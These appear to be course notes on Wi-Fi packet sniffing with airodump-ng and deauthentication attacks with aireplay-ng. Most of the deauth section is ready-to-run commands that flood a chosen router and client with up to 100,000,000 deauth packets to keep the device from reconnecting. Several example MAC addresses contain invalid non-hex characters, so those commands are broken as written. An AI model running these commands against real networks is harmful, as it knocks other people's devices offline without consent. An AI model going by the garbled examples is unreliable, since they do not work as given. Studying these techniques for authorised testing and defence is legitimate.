# Packet Sniffing and Pre-Connection Attacks

## Using `airodump-ng`

- **Purpose**: Capture packets and display network information and connected clients.
- **Monitor Mode**: The interface must be in monitor mode to use `airodump-ng`.

### Key Terms

- **ESSID**: Name of the wireless network.
- **BSSID**: MAC address of the network.
- **PWR**: Signal strength (higher numbers indicate stronger signals).
- **Beacon**: Frames sent to announce the network's presence, even if hidden.
- **MB**: Maximum speed supported by the network.
- **ENC**: Encryption type (e.g., WEP, WPA, WPA2).

### WiFi Bands

- **2.4 GHz & 5 GHz Frequencies**:
    - Previously, only the 2.4 GHz band was visible.
    - Sniffing 5 GHz is now possible.

### Commands

- **Sniffing 5 GHz**:
    
    bash
    
    Copy code
    
    `airodump-ng --band a wlan0`
    
- **Sniffing 2.4 GHz & 5 GHz Simultaneously**:
    
    bash
    
    Copy code
    
    `airodump-ng --band abg wlan0`
    
    - Note: This method is slower and requires a powerful adapter. It's better to sniff each band independently for efficiency.

## Targeted Packet Sniffing

- **Command**:
    
    bash
    
    Copy code
    
    `airodump-ng --bssid C8:5A:9F:F1:57:B7 --channel 11 --write test wlan0`
    
    - **Explanation**: Sniffs a targeted network by specifying the BSSID and channel, and writes the data to a file named `test`.
- **Viewing Captured Data**:
    
    bash
    
    Copy code
    
    `ls`
    
    - Expected output files:
        
        go
        
        Copy code
        
        `test-01.cap test-01.csv test-01.kismet.csv test-01.kismet.netxml test-01.log.csv`
        
- **Main File**: `test-01.cap` contains everything the devices did on the internet, but data is encrypted.
    

## Deauthentication Attack

- **Purpose**: Disconnect any device from the network without needing the network key.
- **Method**:
    - Change your MAC address to the client's MAC and send deauthentication packets to both the router and the client.

### Commands

- **Basic Deauthentication Attack**:
    
    bash
    
    Copy code
    
    `aireplay-ng --deauth [num_packets] -a [router_mac] -c [target_mac] wlan0`
    
    - Example:
        
        bash
        
        Copy code
        
        `aireplay-ng --deauth 100000000 -a O8:5A:4F:F1:E7:G7 -c 9C:28:F7:61:BF:BC wlan0`
        
- **5 GHz Network Deauthentication**:
    
    bash
    
    Copy code
    
    `aireplay-ng --deauth 100000000 -a [router_mac] -c [target_mac] -D wlan0`
    
    - Example:
        
        bash
        
        Copy code
        
        `aireplay-ng --deauth 100000000 -a M8:5P:9F:F1:07:B7 -c 9C:28:F7:61:BF:BC -D wlan0`
        

### Continuous Attack

- **Run in Separate Terminal**:
    
    bash
    
    Copy code
    
    `airodump-ng --bssid C7:DA:VF:L1:57:B7 --channel 11 wlan0`
    
    - Another terminal:
        
        bash
        
        Copy code
        
        `aireplay-ng --deauth 1000000 -a C7:DA:VF:L1:57:B7 -c CC:28:FY:61:0F:RC wlan0`
        
- **Large Number of Packets**: The large number ensures continuous deauthentication, preventing the client from reconnecting.